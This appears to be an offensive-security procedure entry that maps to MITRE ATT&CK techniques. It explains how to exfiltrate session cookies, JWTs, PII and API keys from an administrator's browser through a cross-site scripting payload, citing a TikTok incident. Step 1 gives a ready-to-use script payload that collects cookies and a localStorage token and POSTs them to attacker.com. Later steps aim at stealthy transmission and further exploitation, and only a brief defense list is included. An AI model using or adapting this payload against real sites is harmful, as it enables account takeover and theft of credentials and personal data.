---
id: proc-tiktok-xss-exfil-4
tags:
  - xss
  - exfiltration
  - data-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
updated_at: '2025-12-14T17:32:48.332Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Exfiltrate-Sensitive-Data-via-XSS-Payload

## Summary

This procedure uses the executing XSS payload to steal and transmit sensitive data from the administrative browser session, including session tokens, JWT credentials, PII, API keys, internal paths, and backend details.

## Description

Upon execution, the payload accesses browser APIs to gather data (e.g., cookies, localStorage, network fetches) and sends it to an external endpoint. In the TikTok case, this leaked highly sensitive internal information, compromising the administrative environment.

## Requirements

1. Successful payload execution in admin session.
2. Attacker-controlled server for receiving data.
3. Payload with exfiltration logic (e.g., fetch API).

## Defense

Defensive measures and detection strategies:

- Block outbound requests from internal tools using network firewalls.
- Encrypt sensitive data in browser storage and monitor for unauthorized access.
- Implement data loss prevention (DLP) tools to detect anomalous exfiltration.

## Objectives

1. Capture comprehensive admin session data.
2. Transmit data stealthily to external control.
3. Maximize impact by including architectural insights.

## Instructions

### Step 1: Capture Data in Payload

**Context**: Extend the payload to collect multiple data sources.

Payload example: `<script>var stolen = {cookies: document.cookie, token: localStorage.getItem('jwt'), paths: window.location}; fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify(stolen)});</script>`

> Gathers cookies, JWTs, PII from forms, and internal URLs.

### Step 2: Transmit to Attacker Endpoint

**Context**: Use HTTP requests to exfiltrate without disrupting the session.

The fetch or img src tag sends data asynchronously.

> Expected: Data arrives at server, including emails, phone numbers, API keys.

### Step 3: Analyze Received Data

**Context**: Review exfiltrated content for further exploitation.

Parse incoming requests for backend architecture and credentials.

> Success if full dataset received without truncation.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Exfiltration Over Command and Control Channel]] Exfiltration Over C2 Channel

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Exfiltration]]
